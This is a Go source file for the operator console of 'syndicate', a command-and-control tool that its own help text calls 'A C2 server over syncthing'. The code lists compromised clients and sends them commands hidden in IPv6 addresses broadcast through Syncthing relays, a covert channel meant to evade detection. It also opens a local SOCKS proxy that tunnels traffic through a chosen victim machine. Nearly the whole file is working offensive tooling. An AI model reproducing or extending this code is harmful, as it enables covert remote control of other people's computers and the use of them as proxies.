package main

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/gob"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"

	"gitlab.torproject.org/acheong08/syndicate/lib"
	"gitlab.torproject.org/acheong08/syndicate/lib/commands"
	"gitlab.torproject.org/acheong08/syndicate/lib/relay"
	"gitlab.torproject.org/acheong08/syndicate/lib/utils"

	"github.com/leaanthony/clir"
	"github.com/rotisserie/eris"
)

func main() {
	// clientIndex is always +1 of the actual index as 0 means broadcast
	var clientIndex int
	var countryCode string
	var commandText string

	cli := clir.NewCli("syndicate", "A C2 server over syncthing", "v0.0.1")
	listCmd := cli.NewSubCommand("list", "List all clients")
	listCmd.Action(func() error {
		clientList := getClientList()
		for i, client := range clientList {
			fmt.Printf("%d: %s\n", i+1, client.String())
		}
		return nil
	})

	listenCmd := cli.NewSubCommand("listen", "Start broadcasting with a specific device ID and wait for relay connections")
	listenCmd.IntFlag("client", "The client index to interact with", &clientIndex)
	listenCmd.StringFlag("country", "The country code of the relay to pick", &countryCode)
	listenCmd.StringFlag("command", "The command to execute", &commandText)
	listenCmd.Action(func() error {
		clientList := getClientList()
		// TODO: Support broadcast to all clients
		if clientIndex == 0 || clientIndex > len(clientList) {
			fmt.Println("Invalid client index. Clients:")
			for i, client := range clientList {
				fmt.Printf("%d: %s\n", i+1, client.String())
			}
			return eris.New("invalid arguments")
		}

		commandStruct, err := commands.ParseCommand(commandText)
		if err != nil {
			return eris.Wrap(err, "failed to parse command")
		}
		if countryCode == "" {
			countryCode = "GB"
		}

		client := clientList[clientIndex-1]
		// Find optimal relay
		relayAddress, err := findOptimalRelay(countryCode)
		if err != nil {
			return eris.Wrap(err, "failed to find optimal relay")
		}
		cert, err := tls.X509KeyPair(client.ServerCert[0], client.ServerCert[1])
		if err != nil {
			return eris.Wrap(err, "failed to load client certificate")
		}
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// Encode command and randomness to IPv6
		b := make([]byte, 5)
		// The first byte is the command
		b[0] = byte(commandStruct.Command)
		// The next 4 bytes is a uint32 random number
		binary.BigEndian.PutUint32(b[1:], rand.Uint32())
		ips, ports, err := utils.EncodeIPv6(b, client.ClientID)
		if err != nil {
			return eris.Wrap(err, "could not encode data to IPv6")
		}
		// Convert to URLs to pass into address lister
		urls, err := utils.ToURL(ips, ports)
		if err != nil {
			return eris.Wrap(err, "could not convert ips/ports to URLs")
		}
		lister := relay.AddressLister{
			RelayAddress:  relayAddress,
			DataAddresses: urls,
		}
		// Start broadcasting
		syncthing, err := lib.NewSyncthing(ctx, cert, &lister)
		if err != nil {
			return eris.Wrap(err, "could not create syncthing instance")
		}
		syncthing.Serve()

		// Wait for exit signal
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, os.Interrupt)
		<-sigChan

		return nil
	})

	var relayAddress string
	socksCmd := cli.NewSubCommand("socks", "Listen for local socks connections and forward to a client")
	socksCmd.IntFlag("client", "The client index to interact with", &clientIndex)
	socksCmd.StringFlag("relay", "URL of the relay to use", &relayAddress)
	socksCmd.Action(func() error {
		clientList := getClientList()
		clientEntry := clientList[clientIndex-1]
		cert, err := tls.X509KeyPair(clientEntry.ServerCert[0], clientEntry.ServerCert[1])
		if err != nil {
			return eris.Wrap(err, "failed to load client certificate")
		}
		listener, _ := net.Listen("tcp", "127.0.0.1:1070")
		for {
			socksConn, err := listener.Accept()
			if err != nil {
				fmt.Println(eris.ToString(eris.Wrap(err, "Failed to accept incoming socks connection"), true))
				continue
			}
			relayURL, _ := url.Parse(relayAddress)
			go lib.HandleSocks(relayURL, socksConn, clientEntry.ClientID, cert)
		}
	})
	err := cli.Run()
	if err != nil {
		fmt.Println(eris.ToString(err, true))
	}
}

func getClientList() lib.ClientList {
	var clientList lib.ClientList
	configDir, err := os.UserConfigDir()
	if err != nil {
		panic(err)
	}
	configDir += "/syndicate"
	file, err := os.Open(configDir + "/clients.bin")
	defer file.Close()
	if err != nil {
		return clientList
	}
	decoder := gob.NewDecoder(file)
	decoder.Decode(&clientList)
	return clientList
}
